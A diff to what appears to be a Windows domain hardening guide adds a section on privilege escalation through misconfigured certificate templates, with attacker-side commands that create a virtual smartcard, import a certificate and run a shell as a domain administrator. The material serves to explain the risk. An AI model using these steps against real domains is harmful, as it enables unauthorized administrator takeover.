@@ -60,3 +60,18 @@ This way attackers can make their way through your environment.
 To prevent this you might want to use Microsoft LAPS
 - https://www.msxfaq.de/windows/endpointsecurity/laps.htm
 - https://docs.microsoft.com/en-us/previous-versions/mt227395(v=msdn.10)?redirectedfrom=MSDN
+
+### Smartcard/Certificate-based privilege escalation
+misconfigured certificate-templates can be abused by users with local administrative permissions, to gain domain administrator.
+
+An attacker could possibly make a certificate request with an alternative name (e.g. "administrator@yourdomain.com).
+If the certificate authority issues an certificate, this can be abused within a virtual smartcard which then can be used to authenticate against server.
+The server will trust the smartcard, as it is signed by a trusted CA.
+
+Commands to be used on attacker side:
+TpmVscMgr create /name MyVSC /pin default /adminkey random /generate
+    
+certutil -csp “Microsoft Base Smart Card Crypto Provider” -importpfx C:\_INSTALL\WSCert.pfx
+    
+runas /user:lab.administrator@yourdomain.com /smartcard cmd
+PIN = 12345678
